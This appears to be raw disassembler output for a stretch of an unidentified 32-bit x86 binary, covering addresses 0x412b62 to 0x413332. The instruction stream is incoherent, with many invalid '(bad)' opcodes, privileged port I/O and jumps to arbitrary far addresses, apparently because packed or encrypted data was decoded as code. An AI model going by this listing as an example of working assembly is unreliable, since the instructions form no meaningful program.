  412b62:	sub    al,0xdc
  412b64:	inc    eax
  412b65:	stos   BYTE PTR es:[edi],al
  412b66:	arpl   di,cx
  412b68:	fwait
  412b69:	jo     0x412b31
  412b6b:	dec    edi
  412b6c:	pop    ebx
  412b6d:	lock sbb ah,BYTE PTR [ecx+0x5c]
  412b71:	jmp    0x4bd6:0x597546a8
  412b78:	outs   dx,DWORD PTR ds:[esi]
  412b79:	xchg   BYTE PTR [esi-0xb],bh
  412b7c:	sbb    al,al
  412b7e:	xor    edi,DWORD PTR ds:0x2ebe8e4f
  412b84:	xor    DWORD PTR [ecx],edx
  412b86:	xor    BYTE PTR [edi-0x16],bh
  412b89:	pop    edi
  412b8a:	sar    esi,0x34
  412b8d:	lods   eax,DWORD PTR ds:[esi]
  412b8e:	push   edi
  412b8f:	and    BYTE PTR [esi+0x53],ah
  412b92:	inc    edx
  412b93:	push   ebx
  412b94:	mov    dl,0x5b
  412b96:	imul   esp,DWORD PTR [edx+0x4da713ad],0xa015b91d
  412ba0:	dec    ebp
  412ba1:	pop    ss
  412ba2:	add    al,BYTE PTR [ebx+0x2853bbb0]
  412ba8:	fsub   QWORD PTR [esi-0x7f]
  412bab:	test   DWORD PTR ds:0x2c50a27,esi
  412bb1:	pop    eax
  412bb2:	xlat   BYTE PTR ds:[ebx]
  412bb3:	pop    edx
  412bb4:	xchg   ecx,eax
  412bb5:	ret    0xbb3c
  412bb8:	mov    dl,cl
  412bba:	adc    ebx,ecx
  412bbc:	in     al,0x54
  412bbe:	sub    al,bh
  412bc0:	xchg   DWORD PTR [edi+0x3e],edx
  412bc3:	push   esp
  412bc4:	jmp    0x9f0b:0x3d34a7c9
  412bcb:	cmp    eax,0x18d07d1f
  412bd0:	sahf   
  412bd1:	popf   
  412bd2:	fiadd  WORD PTR [ecx]
  412bd4:	fcomi  st,st(6)
  412bd6:	sub    al,0xa3
  412bd8:	shr    DWORD PTR [ebp-0x7bffee36],cl
  412bde:	mov    al,0x2b
  412be0:	sub    DWORD PTR [ecx+0x7e],esp
  412be3:	shl    BYTE PTR [edx+ebx*1-0x57],cl
  412be7:	sub    esi,ecx
  412be9:	sub    edx,DWORD PTR [edi+0xe0705ea]
  412bef:	fist   WORD PTR ds:0x663deb65
  412bf5:	test   eax,0xa4fab15e
  412bfa:	push   0x4
  412bfc:	xchg   esi,eax
  412bfd:	in     al,0x1e
  412bff:	inc    eax
  412c00:	xor    ebp,esi
  412c02:	dec    esi
  412c03:	sub    bh,dl
  412c05:	or     ch,BYTE PTR ds:0xe5f6e6ba
  412c0b:	xor    DWORD PTR [edi+esi*4-0x7b],ecx
  412c0f:	xor    cl,al
  412c11:	cli    
  412c12:	push   eax
  412c13:	and    eax,0x296472cd
  412c18:	mov    ebx,0xd2cc758a
  412c1d:	jno    0x412c34
  412c1f:	lds    ebx,FWORD PTR [ecx+ebx*2+0x30]
  412c23:	rcr    BYTE PTR [ebp+0x289f6196],cl
  412c29:	je     0x412c9a
  412c2b:	push   ss
  412c2c:	stc    
  412c2d:	sub    BYTE PTR [ebx+0x763f81da],ah
  412c33:	imul   ebx,DWORD PTR [ecx-0x7d],0x68014916
  412c3a:	jmp    0x25da6c31
  412c3f:	into   
  412c40:	sbb    ah,BYTE PTR ds:0xd11ecb3c
  412c46:	outs   dx,DWORD PTR ds:[esi]
  412c47:	push   eax
  412c48:	lods   al,BYTE PTR ds:[esi]
  412c49:	xor    dl,BYTE PTR [ecx]
  412c4b:	std    
  412c4c:	sub    BYTE PTR [esi],cl
  412c4e:	push   ebp
  412c4f:	adc    DWORD PTR [ebx+esi*8],esi
  412c52:	cmp    DWORD PTR [bx+di+0x6be8],0xaa7f681a
  412c5b:	push   ds
  412c5c:	xchg   esi,eax
  412c5d:	push   edx
  412c5e:	fild   QWORD PTR [ecx]
  412c60:	add    edi,DWORD PTR [ebp-0x5a11ee15]
  412c66:	div    DWORD PTR [edi-0x4c]
  412c69:	ds pop es
  412c6b:	clc    
  412c6c:	xor    DWORD PTR [edi],ecx
  412c6e:	scas   eax,DWORD PTR es:[edi]
  412c6f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412c70:	xchg   ebx,eax
  412c71:	stc    
  412c72:	lods   eax,DWORD PTR ds:[esi]
  412c73:	mov    esp,DWORD PTR [esi]
  412c75:	fimul  WORD PTR [esi+0x148b6392]
  412c7b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412c7c:	fisttp QWORD PTR [esi+0x24]
  412c7f:	shr    BYTE PTR [ebx],0x1c
  412c82:	or     dh,BYTE PTR [ebx+ebp*1+0x493e80ec]
  412c89:	pop    ecx
  412c8a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412c8b:	test   eax,0xc34fa426
  412c90:	stc    
  412c91:	fs int3 
  412c93:	retf   
  412c94:	fwait
  412c95:	adc    dl,BYTE PTR [edi+0x690f07aa]
  412c9b:	call   DWORD PTR [eax+0x4f5f6e9e]
  412ca1:	fistp  WORD PTR [ebp+0x3c941424]
  412ca7:	sahf   
  412ca8:	leave  
  412ca9:	add    ch,0xaa
  412cac:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412cad:	jo     0x412c6c
  412caf:	loop   0x412cf4
  412cb1:	inc    ebx
  412cb2:	pop    ebx
  412cb3:	fimul  DWORD PTR [ebp+ebx*4-0x15]
  412cb7:	mov    al,0xef
  412cb9:	stc    
  412cba:	rcr    DWORD PTR [eax+eiz*4],1
  412cbd:	jle    0x412c7d
  412cbf:	arpl   WORD PTR ds:0x3e838aa9,ax
  412cc5:	(bad)  
  412cc6:	xor    dh,ah
  412cc8:	icebp  
  412cc9:	ss (bad) 
  412ccb:	pop    ecx
  412ccc:	push   eax
  412ccd:	push   0x38
  412ccf:	aaa    
  412cd0:	push   ebx
  412cd1:	cmp    DWORD PTR [edi+edi*4-0x9],esp
  412cd5:	and    ecx,DWORD PTR [edi-0x904f1ba]
  412cdb:	inc    edx
  412cdc:	(bad)  
  412cdd:	sti    
  412cde:	pop    ebx
  412cdf:	aad    0x2f
  412ce1:	inc    esp
  412ce2:	test   BYTE PTR [edi+0x25],bl
  412ce5:	and    bl,bl
  412ce7:	pusha  
  412ce8:	and    eax,0x555addf3
  412ced:	bound  esi,QWORD PTR [ecx-0x308a2b92]
  412cf3:	dec    ebp
  412cf4:	dec    ebx
  412cf5:	rcl    ah,cl
  412cf7:	repz lock inc ebp
  412cfa:	test   DWORD PTR [ecx+0x4087591c],0x10a6d9a8
  412d04:	clc    
  412d05:	lods   al,BYTE PTR ds:[esi]
  412d06:	retf   
  412d07:	js     0x412c8a
  412d09:	ins    BYTE PTR es:[edi],dx
  412d0a:	test   BYTE PTR [ebp-0x6f4e542b],dl
  412d10:	adc    dl,ch
  412d12:	jmp    ebp
  412d14:	jg     0x412c97
  412d16:	ins    DWORD PTR es:[edi],dx
  412d17:	fild   WORD PTR [ecx+esi*8+0x6c]
  412d1b:	jo     0x412d32
  412d1d:	ins    DWORD PTR es:[edi],dx
  412d1e:	push   0xffffffae
  412d20:	fwait
  412d21:	rcl    BYTE PTR [ecx],1
  412d23:	xor    BYTE PTR [ebp-0x23],cl
  412d26:	sub    DWORD PTR [ecx],edi
  412d28:	push   esi
  412d29:	mov    ecx,esp
  412d2b:	push   DWORD PTR [ecx+edx*8+0xe]
  412d2f:	push   esi
  412d30:	sbb    ebp,ebp
  412d32:	retf   
  412d33:	inc    ecx
  412d34:	retf   0x332b
  412d37:	fwait
  412d38:	mov    al,0x5a
  412d3a:	fistp  QWORD PTR [edx-0x6f]
  412d3d:	cli    
  412d3e:	xor    BYTE PTR [edi],bl
  412d40:	into   
  412d41:	xchg   ecx,eax
  412d42:	loop   0x412d1e
  412d44:	jge    0x412d0c
  412d46:	lods   al,BYTE PTR ds:[esi]
  412d47:	jnp    0x412d0f
  412d49:	and    ebx,DWORD PTR [ebx+0x797165a1]
  412d4f:	inc    eax
  412d50:	retf   
  412d51:	(bad)  
  412d52:	mov    ds,si
  412d55:	dec    edx
  412d56:	out    0xad,eax
  412d58:	mov    ebx,0x54c34db6
  412d5d:	mov    bl,0xfd
  412d5f:	xchg   DWORD PTR [eax+0x359cd6],edi
  412d65:	jge    0x412dbf
  412d67:	aam    0xd4
  412d69:	bound  ebp,QWORD PTR [eax]
  412d6b:	sbb    ebx,DWORD PTR [edi]
  412d6d:	rol    ch,0x63
  412d70:	aad    0x53
  412d72:	xor    cl,BYTE PTR [edx+0x61]
  412d75:	(bad)  
  412d76:	fsub   st,st(6)
  412d78:	inc    edi
  412d79:	imul   edi,DWORD PTR [ecx+ebx*8+0x29],0xd760f497
  412d81:	xchg   esp,eax
  412d82:	loope  0x412d9f
  412d84:	icebp  
  412d85:	push   cs
  412d86:	std    
  412d87:	mov    esi,0x30acb2b4
  412d8c:	js     0xc60619cd
  412d92:	pop    esi
  412d93:	and    edx,DWORD PTR [ecx-0x6cdf433f]
  412d99:	out    dx,al
  412d9a:	loope  0x412ded
  412d9c:	mov    edx,0xeb375351
  412da1:	lods   al,BYTE PTR ds:[esi]
  412da2:	cmc    
  412da3:	rcr    BYTE PTR [ebx-0x5c],cl
  412da6:	and    eax,0x6ac88fcf
  412dab:	cmp    BYTE PTR [esi-0x2adb86fd],0x21
  412db2:	or     esp,esp
  412db4:	jo     0x412dc2
  412db6:	jne    0x412da0
  412db8:	xchg   DWORD PTR [edi],ebx
  412dba:	pop    ss
  412dbb:	fldenv [ecx]
  412dbd:	ins    DWORD PTR es:[edi],dx
  412dbe:	mov    ecx,0x4d1a5785
  412dc3:	mul    al
  412dc5:	cmp    DWORD PTR [edi+eax*1+0x6dad9dcb],0xffffff86
  412dcd:	xchg   al,dh
  412dcf:	pusha  
  412dd0:	hlt    
  412dd1:	or     ebp,DWORD PTR [edi-0x56924a76]
  412dd7:	mov    dh,0x77
  412dd9:	shl    ecx,0x94
  412ddc:	push   eax
  412ddd:	pop    edx
  412dde:	and    dh,BYTE PTR [esi]
  412de0:	popf   
  412de1:	xchg   DWORD PTR [edx-0x3d],esi
  412de4:	jno    0x412d71
  412de6:	push   ebp
  412de7:	and    BYTE PTR [esi+0x39fb9923],bl
  412ded:	dec    ecx
  412dee:	mov    eax,0xfe71557
  412df3:	add    eax,0x3720c12
  412df8:	adc    edx,edi
  412dfa:	ins    BYTE PTR es:[edi],dx
  412dfb:	pop    es
  412dfc:	jmp    0x412db7
  412dfe:	fnstcw WORD PTR [edx+0x21]
  412e01:	cmp    eax,0xa2a3fe1
  412e06:	adc    edx,esi
  412e08:	out    dx,al
  412e09:	aas    
  412e0a:	or     edi,DWORD PTR [esi-0x2de29728]
  412e10:	sub    ah,al
  412e12:	pop    ss
  412e13:	sub    ebp,DWORD PTR [ecx+0x2]
  412e16:	xchg   edx,eax
  412e17:	xlat   BYTE PTR ds:[ebx]
  412e18:	jmp    0xdaf3aea5
  412e1d:	sbb    DWORD PTR [edi-0x6c],edi
  412e20:	jns    0x412e4e
  412e22:	jne    0x412e65
  412e24:	mov    esp,0xb62fd548
  412e29:	inc    bx
  412e2b:	fucomi st,st(7)
  412e2d:	repz sahf 
  412e2f:	adc    BYTE PTR ds:0x2d103ede,cl
  412e35:	push   ebx
  412e36:	inc    esp
  412e37:	jge    0x412e37
  412e39:	mov    bh,0xdf
  412e3b:	lock sbb eax,0xeab731a1
  412e41:	jmp    0x412dec
  412e43:	jns    0x412e71
  412e45:	(bad)  [ebx+0x1ccf2a5c]
  412e4b:	(bad)
  412e4f:	fadd   QWORD PTR [edx+0x34]
  412e52:	mov    ebx,0xaad761a2
  412e57:	ret    
  412e58:	popa   
  412e59:	stos   BYTE PTR es:[edi],al
  412e5a:	or     eax,0xd28a4fb1
  412e5f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412e60:	test   al,0xd6
  412e62:	push   edx
  412e63:	add    dh,BYTE PTR [eax+0x3722bdae]
  412e69:	shr    DWORD PTR [ebp-0x6ba76f39],0xb1
  412e70:	(bad)  
  412e71:	pop    esi
  412e72:	jo     0x412e9f
  412e74:	sbb    eax,0x3a754d2f
  412e79:	arpl   WORD PTR [edi-0x567a81a1],si
  412e7f:	jl     0x412e13
  412e81:	mov    edx,0xef101acd
  412e86:	ds push esp
  412e88:	sub    al,BYTE PTR [eax-0x7077d9e5]
  412e8e:	xchg   esp,eax
  412e8f:	and    DWORD PTR [eax+0x4e020ed3],edi
  412e95:	sti    
  412e96:	repz sbb ebp,esi
  412e99:	jne    0x412eb0
  412e9b:	mov    bh,bh
  412e9d:	dec    ebp
  412e9e:	xchg   DWORD PTR [edx],ebp
  412ea0:	mov    bl,0x95
  412ea2:	ins    DWORD PTR es:[edi],dx
  412ea3:	jl     0x412e83
  412ea5:	mov    dl,0xfd
  412ea7:	not    BYTE PTR [eax-0x2a]
  412eaa:	or     cl,BYTE PTR [esi]
  412eac:	(bad)  [ebp-0x16]
  412eaf:	xor    ecx,DWORD PTR [ebx+ebp*2-0x111496d8]
  412eb6:	push   esp
  412eb7:	cli    
  412eb8:	outs   dx,DWORD PTR ds:[esi]
  412eb9:	sbb    BYTE PTR gs:[ebp+0x35],bh
  412ebd:	popf   
  412ebe:	and    DWORD PTR [ebp+edi*1+0x2a],ebp
  412ec2:	scas   eax,DWORD PTR es:[edi]
  412ec3:	(bad)  
  412ec4:	fiadd  WORD PTR [edx]
  412ec6:	cwde   
  412ec7:	lods   al,BYTE PTR ds:[esi]
  412ec8:	xchg   edx,eax
  412ec9:	cmp    DWORD PTR [ebx+0x1497b220],ebp
  412ecf:	inc    esp
  412ed0:	imul   edx,esp,0xffffffa7
  412ed3:	shl    BYTE PTR [eax+ebp*2+0x6ed3f7cc],1
  412eda:	mov    ecx,DWORD PTR [ebp-0x4cd413fa]
  412ee0:	adc    bl,dl
  412ee2:	retf   
  412ee3:	push   esp
  412ee4:	popa   
  412ee5:	rcr    BYTE PTR [ebp+0x42e58d8e],cl
  412eeb:	adc    ebx,esi
  412eed:	mov    dl,BYTE PTR ds:0xe3b508c
  412ef3:	mov    cl,BYTE PTR [ecx]
  412ef5:	jge    0x412ea8
  412ef7:	sub    ch,ah
  412ef9:	ins    BYTE PTR es:[edi],dx
  412efa:	pop    ebx
  412efb:	std    
  412efc:	pop    edi
  412efd:	aaa    
  412efe:	mov    eax,ds:0xf903d600
  412f03:	dec    ebp
  412f04:	addr16 enter 0x37a6,0x98
  412f09:	std    
  412f0a:	nop
  412f0b:	or     BYTE PTR [ecx*8-0x27f54914],bh
  412f12:	arpl   WORD PTR [esi],di
  412f14:	out    0xdd,al
  412f16:	sbb    ch,ch
  412f18:	icebp  
  412f19:	xor    al,0x73
  412f1b:	mov    ch,0x46
  412f1d:	jns    0x412f7d
  412f1f:	cdq    
  412f20:	mov    ch,0xae
  412f22:	and    eax,0x4c904afb
  412f27:	xor    ebx,DWORD PTR [edx]
  412f29:	lea    edx,[esi+0x73]
  412f2c:	mov    edi,DWORD PTR [ecx-0x3da933a4]
  412f32:	cdq    
  412f33:	nop
  412f34:	es mov ch,0x3a
  412f37:	gs pop eax
  412f39:	mov    ah,0x70
  412f3b:	mov    ebp,0x3e3b074e
  412f40:	pop    ebp
  412f41:	mov    eax,DWORD PTR [edx]
  412f43:	fist   WORD PTR [ebx-0x471edf1c]
  412f49:	push   0xffffffee
  412f4b:	mov    bh,0x72
  412f4d:	std    
  412f4e:	and    al,0x38
  412f50:	add    BYTE PTR ds:0xa4de962,0xd3
  412f57:	xchg   esi,eax
  412f58:	sbb    BYTE PTR [ecx],al
  412f5a:	mov    eax,DWORD PTR [ebx]
  412f5c:	fidivr DWORD PTR [ecx-0x27]
  412f5f:	dec    edx
  412f60:	add    DWORD PTR [ecx+0x1f],0xffffff8e
  412f64:	(bad)  
  412f65:	pushf  
  412f66:	inc    esp
  412f67:	mov    eax,ds:0xe2f02479
  412f6c:	dec    edx
  412f6d:	rcl    DWORD PTR [esi],0x2
  412f70:	xchg   bh,dh
  412f72:	push   edi
  412f73:	add    dh,ch
  412f75:	out    0x3c,al
  412f77:	test   al,0xd3
  412f79:	xlat   BYTE PTR ds:[ebx]
  412f7a:	jno    0x412f6e
  412f7c:	jno    0x412f14
  412f7e:	inc    ecx
  412f7f:	jno    0x412f85
  412f81:	adc    eax,0xfffffff5
  412f84:	adc    DWORD PTR [edi*2-0x7781aefa],eax
  412f8b:	rol    BYTE PTR [esi+ebp*4+0x6d4dab3e],1
  412f92:	(bad)  
  412f93:	(bad)  
  412f94:	in     eax,0xae
  412f96:	adc    eax,0xd64d27c
  412f9b:	iret   
  412f9c:	aaa    
  412f9d:	inc    ecx
  412f9e:	pop    edi
  412f9f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412fa0:	and    edi,0xc35af2d5
  412fa6:	push   edx
  412fa7:	push   es
  412fa8:	aaa    
  412fa9:	inc    esi
  412faa:	sbb    bh,BYTE PTR [edx+0x72]
  412fad:	adc    BYTE PTR [esp+eax*4],ah
  412fb0:	shr    BYTE PTR [bp+di-0x2d6a],1
  412fb5:	in     eax,0xc6
  412fb7:	pop    edx
  412fb8:	xlat   BYTE PTR ds:[ebx]
  412fb9:	call   0xf2d82f5e
  412fbe:	test   eax,0xcb55d0d5
  412fc3:	shl    BYTE PTR ds:0xa708ae39,cl
  412fc9:	stos   BYTE PTR es:[edi],al
  412fca:	(bad)  
  412fcb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412fcc:	jge    0x412f6a
  412fce:	iret   
  412fcf:	adc    BYTE PTR [esi-0x10c147ea],dh
  412fd5:	and    ch,BYTE PTR [eax]
  412fd7:	retf   0x40d2
  412fda:	maskmovq mm5,(bad)
  412fdb:	imul   DWORD PTR [ecx-0x1b403c52]
  412fe1:	int3   
  412fe2:	cmp    edi,DWORD PTR [edi-0x5a]
  412fe5:	ds xchg ecx,eax
  412fe7:	push   0x5f
  412fe9:	xor    eax,0x32af3956
  412fee:	(bad)  
  412fef:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412ff0:	cmp    dl,BYTE PTR [edi-0x36636344]
  412ff6:	xlat   BYTE PTR ds:[ebx]
  412ff7:	loope  0x413067
  412ff9:	dec    esp
  412ffa:	mov    DWORD PTR ds:0x55de4ff3,edx
  413000:	sub    cl,BYTE PTR [edx+0x11]
  413003:	push   es
  413004:	and    al,0xdf
  413006:	inc    eax
  413007:	xchg   esp,eax
  413008:	push   esi
  413009:	xor    BYTE PTR [ecx-0x59],0xa9
  41300d:	or     eax,0x94835c98
  413012:	xchg   ebp,eax
  413013:	adc    eax,0x8a656c28
  413018:	pop    edi
  413019:	out    dx,eax
  41301a:	inc    edx
  41301b:	out    0x87,eax
  41301d:	cs pop eax
  41301f:	arpl   WORD PTR [ebx],di
  413021:	xchg   edx,eax
  413022:	pop    edx
  413023:	or     DWORD PTR [ecx+0x2a],ebp
  413026:	popf   
  413027:	shr    DWORD PTR [ebx+edi*8],1
  41302a:	add    dl,BYTE PTR [bp+si+0x73ab]
  41302f:	xchg   edi,eax
  413030:	test   edx,ebp
  413032:	hlt    
  413033:	xchg   DWORD PTR [edi+0x4f28244b],edi
  413039:	lahf   
  41303a:	xor    esp,esp
  41303c:	cmp    BYTE PTR [ebx],bl
  41303e:	jp     0x412fe7
  413040:	mov    cl,BYTE PTR [ebp-0x80]
  413043:	adc    ecx,eax
  413045:	imul   ebx,DWORD PTR [edx-0x16],0xffffffa3
  413049:	cmc    
  41304a:	and    eax,0xa7b38276
  41304f:	xor    ah,bl
  413051:	fist   DWORD PTR [edi-0xf]
  413054:	lea    ebx,[eax-0x20]
  413057:	inc    ecx
  413058:	jbe    0x41302c
  41305a:	sbb    al,0x90
  41305c:	inc    edx
  41305d:	mov    al,bl
  41305f:	sbb    cl,dl
  413061:	jnp    0x413038
  413063:	cmp    ebx,DWORD PTR [ebp+0x5b]
  413066:	imul   edi,DWORD PTR [edi-0x575a35de],0x5db7d313
  413070:	and    al,0x8f
  413072:	cmp    al,0x1e
  413074:	pop    esp
  413075:	xor    eax,0x7f25aca6
  41307a:	stc    
  41307b:	push   edi
  41307c:	jecxz  0x4130ee
  41307e:	mov    cs,WORD PTR [ebp+0x708cc7ac]
  413084:	jbe    0x4130cd
  413086:	mov    esi,0x72d57fd4
  41308b:	and    DWORD PTR [ebx+0x47],edx
  41308e:	jge    0x4130c5
  413090:	push   ebp
  413091:	cmp    eax,0xc9ac4890
  413096:	jmp    0x5aa1:0xb9c32b5c
  41309d:	jge    0x41302e
  41309f:	cmc    
  4130a0:	push   ecx
  4130a1:	out    0xf6,al
  4130a3:	pop    ebx
  4130a4:	or     al,0xa1
  4130a6:	mov    ah,0x16
  4130a8:	bound  ebx,QWORD PTR [edi]
  4130aa:	popf   
  4130ab:	in     eax,dx
  4130ac:	jae    0x413101
  4130ae:	adc    esp,eax
  4130b0:	std    
  4130b1:	sub    al,0x86
  4130b3:	(bad)
  4130b6:	mov    edi,0xb24e8e1b
  4130bb:	sub    BYTE PTR [edi+esi*1],cl
  4130be:	aas    
  4130bf:	push   esp
  4130c0:	add    eax,0xca2f455
  4130c5:	sub    eax,0x559299cf
  4130ca:	push   ebp
  4130cb:	scas   eax,DWORD PTR es:[edi]
  4130cc:	sub    esi,0xc885ecc2
  4130d2:	mov    ecx,0xe467ed8d
  4130d7:	and    ch,BYTE PTR ds:0x22be64d2
  4130dd:	mov    eax,ds:0xe3b3104a
  4130e2:	adc    al,0xb0
  4130e4:	aas    
  4130e5:	jne    0x41313b
  4130e7:	adc    edi,edx
  4130e9:	(bad)  
  4130ea:	xor    DWORD PTR fs:[ecx],eax
  4130ed:	fldcw  WORD PTR [edi-0x77ba226f]
  4130f3:	test   DWORD PTR [ecx+0x1d002bd6],eax
  4130f9:	sbb    BYTE PTR [esi],ah
  4130fb:	xchg   edi,eax
  4130fc:	fnstenv [ebx-0x21]
  4130ff:	sbb    bl,BYTE PTR [edx+0x17]
  413102:	ds jp  0x413100
  413105:	xor    esp,DWORD PTR [ebx]
  413107:	xchg   ecx,eax
  413108:	cmp    BYTE PTR [edi],0xab
  41310b:	xlat   BYTE PTR es:[ebx]
  41310d:	jb     0x413109
  41310f:	les    edi,FWORD PTR [esp+0x6d0655ac]
  413116:	dec    ecx
  413117:	xchg   ebp,eax
  413118:	mov    ah,0x10
  41311a:	dec    esp
  41311b:	push   es
  41311c:	add    al,0x61
  41311e:	idiv   DWORD PTR ds:0x280755f5
  413124:	xor    ebx,DWORD PTR [ecx+ebp*2-0x731b72b9]
  41312b:	call   0xc796fb83
  413130:	xor    al,0x1a
  413132:	inc    ebx
  413133:	xor    BYTE PTR [eax-0x708f2824],dh
  413139:	loope  0x413194
  41313b:	out    0x92,eax
  41313d:	std    
  41313e:	cdq    
  41313f:	xchg   esi,eax
  413140:	sbb    BYTE PTR [eax+0x8],bh
  413143:	mov    dh,0x47
  413145:	sub    BYTE PTR [edi-0x62],ch
  413148:	test   BYTE PTR [eax+eax*1-0x3e],ch
  41314c:	and    al,0x41
  41314e:	stos   DWORD PTR es:[edi],eax
  41314f:	sbb    BYTE PTR [esp+eiz*8-0x6c],bh
  413153:	mov    ecx,0xcffb22c9
  413158:	cmc    
  413159:	out    0xe8,eax
  41315b:	and    al,BYTE PTR [eax+0x58558408]
  413161:	lods   al,BYTE PTR ds:[esi]
  413162:	pop    ds
  413163:	sbb    ecx,DWORD PTR [esi]
  413165:	pop    ss
  413166:	jmp    0xd7d2:0x7502dba
  41316d:	int    0x0
  41316f:	sbb    al,bh
  413171:	xchg   edx,eax
  413172:	xlat   BYTE PTR ds:[ebx]
  413173:	sub    esi,DWORD PTR ds:[eax-0x4d]
  413177:	mov    BYTE PTR [esi-0x25],al
  41317a:	push   ebp
  41317b:	dec    edi
  41317c:	sub    DWORD PTR [edx+0x6ab36fa0],eax
  413182:	mov    esp,0x309f81c
  413187:	fbld   TBYTE PTR [ebx+0x31]
  41318a:	aad    0x6b
  41318c:	push   esi
  41318d:	pop    esp
  41318e:	fnsave [di+0x58]
  413192:	shl    DWORD PTR [esi+0x2af8316e],cl
  413198:	cmp    edx,DWORD PTR [edx]
  41319a:	mov    bl,0x37
  41319c:	jg     0x4131fc
  41319e:	jmp    FWORD PTR [ebp+0x1e8ca279]
  4131a4:	pop    ds
  4131a5:	addr16 mov ah,0x77
  4131a8:	addr16 jmp 0xcc15c3a5
  4131ae:	jle    0x4131f4
  4131b0:	push   ecx
  4131b1:	mov    DWORD PTR [ebx+0x78],0x70948bd7
  4131b8:	sar    BYTE PTR [ebx+0x5921a5c9],cl
  4131be:	jle    0x413226
  4131c0:	sub    al,0x33
  4131c2:	sbb    al,0xaf
  4131c4:	cmc    
  4131c5:	aad    0x63
  4131c7:	mov    al,0x5
  4131c9:	dec    ecx
  4131ca:	je     0x4131c0
  4131cc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4131cd:	push   es
  4131ce:	mov    eax,DWORD PTR [edx]
  4131d0:	mov    BYTE PTR [ecx-0x4f],0xef
  4131d4:	lea    ebx,[ebp-0x7e7324f6]
  4131da:	sti    
  4131db:	fidiv  DWORD PTR [ecx+0x7a41b8d]
  4131e1:	ja     0x413262
  4131e3:	shl    BYTE PTR [ecx],1
  4131e5:	dec    ebp
  4131e6:	adc    ah,BYTE PTR [ecx-0x54]
  4131e9:	setns  BYTE PTR [edi+0x54]
  4131ed:	fucomip st,st(5)
  4131ef:	pop    ecx
  4131f0:	xchg   edx,eax
  4131f1:	sbb    al,0x22
  4131f3:	sti    
  4131f4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4131f5:	cdq    
  4131f6:	ins    BYTE PTR es:[edi],dx
  4131f7:	mov    eax,ds:0xa8731b51
  4131fc:	test   DWORD PTR [edx+ecx*4-0xe97825d],ebx
  413203:	sbb    BYTE PTR [edi-0x257c23b1],bh
  413209:	std    
  41320a:	xor    edx,DWORD PTR [ebp-0x79539fef]
  413210:	mov    dl,0xe5
  413212:	mov    ecx,0xdc9010ca
  413217:	xchg   ebp,eax
  413218:	xor    cl,ah
  41321a:	call   0x247eb5b9
  41321f:	inc    eax
  413220:	jp     0x4131fa
  413222:	jmp    0x81c9025d
  413227:	sub    eax,DWORD PTR [ebx+0x542c741c]
  41322d:	sub    eax,0x4decf1df
  413232:	sub    ebx,DWORD PTR [edx]
  413234:	pop    eax
  413235:	jmp    0x41327e
  413237:	lds    eax,FWORD PTR [edx-0x245f99e0]
  41323d:	mov    dh,0x7b
  41323f:	xchg   edx,eax
  413240:	inc    edx
  413241:	sub    DWORD PTR [ecx+ebp*2],edx
  413244:	mov    ds:0x7a5260b1,al
  413249:	pop    edi
  41324a:	sahf   
  41324b:	js     0x4131d5
  41324d:	cwde   
  41324e:	scas   eax,DWORD PTR es:[edi]
  41324f:	pop    es
  413250:	out    dx,eax
  413251:	add    ebp,ebp
  413253:	stc    
  413254:	or     edi,0x8f26503
  41325a:	data16 jns 0x41324d
  41325d:	xor    dl,BYTE PTR [edx+0x32d0e4ba]
  413263:	push   0x6e6a776
  413268:	adc    al,0xc
  41326a:	shr    DWORD PTR [edx],cl
  41326c:	sbb    al,0x2e
  41326e:	bnd ret 0x5dc
  413272:	shl    DWORD PTR [ebp+0x6f6e54c0],0x42
  413279:	or     bl,al
  41327b:	cdq    
  41327c:	or     BYTE PTR [eax-0x305008ca],dh
  413282:	div    BYTE PTR [ebp+0x1b47d98c]
  413288:	jnp    0x4132cd
  41328a:	jmp    0xec7d:0x3717e587
  413291:	fldenv [esi+0x5a]
  413294:	(bad)  
  413295:	push   eax
  413296:	xchg   ebp,eax
  413297:	push   edi
  413298:	pop    edx
  413299:	cmp    al,0x7f
  41329b:	in     al,dx
  41329c:	sub    eax,0xff7abd0e
  4132a1:	cmp    eax,0xea850d9f
  4132a6:	dec    ecx
  4132a7:	inc    eax
  4132a8:	ficom  WORD PTR [ecx]
  4132aa:	les    edx,FWORD PTR [edx-0x1f1751ce]
  4132b0:	inc    eax
  4132b1:	ss imul ebx,ebp,0x61
  4132b5:	pop    ds
  4132b6:	aad    0x97
  4132b8:	popa   
  4132b9:	xor    DWORD PTR [ebx-0x4ed21fa0],edx
  4132bf:	or     ebx,eax
  4132c1:	push   cs
  4132c2:	sub    BYTE PTR [ecx+edi*2-0x11],ch
  4132c6:	in     eax,0x94
  4132c8:	jmp    0x2e25e9e5
  4132cd:	add    BYTE PTR [ecx+0x468f8eb1],al
  4132d3:	jmp    FWORD PTR [esi+0x5a729c5d]
  4132d9:	cmp    DWORD PTR [eax],ebx
  4132db:	out    dx,eax
  4132dc:	xor    edi,ecx
  4132de:	mov    esi,0x4575901
  4132e3:	(bad)  
  4132e4:	fsubr  st,st(1)
  4132e6:	out    dx,al
  4132e7:	pop    ebp
  4132e8:	ret    
  4132e9:	shl    BYTE PTR [edi+esi*4+0x4e],1
  4132ed:	repz in al,0x5b
  4132f0:	test   eax,0xc6ccefac
  4132f5:	imul   ebp,DWORD PTR [esi-0x2764ff9e],0x82dc60f0
  4132ff:	js     0x413291
  413301:	lea    eax,[ebx]
  413303:	mov    edx,0x9188855
  413308:	dec    esi
  413309:	stc    
  41330a:	mov    eax,0x91399629
  41330f:	jnp    0x413363
  413311:	ins    BYTE PTR es:[edi],dx
  413312:	repz sbb eax,0x8f085891
  413318:	xchg   BYTE PTR [ebx],bh
  41331a:	hlt    
  41331b:	cmp    ah,BYTE PTR [eax-0x48]
  41331e:	lea    ebx,[eax+0x6a9e849e]
  413324:	sub    al,0x1e
  413326:	cmp    ebp,esi
  413328:	add    al,0x4a
  41332a:	xchg   edi,eax
  41332b:	call   0x8e1e223d
  413330:	out    dx,al
  413331:	ins    DWORD PTR es:[edi],dx
  413332:	(bad)  
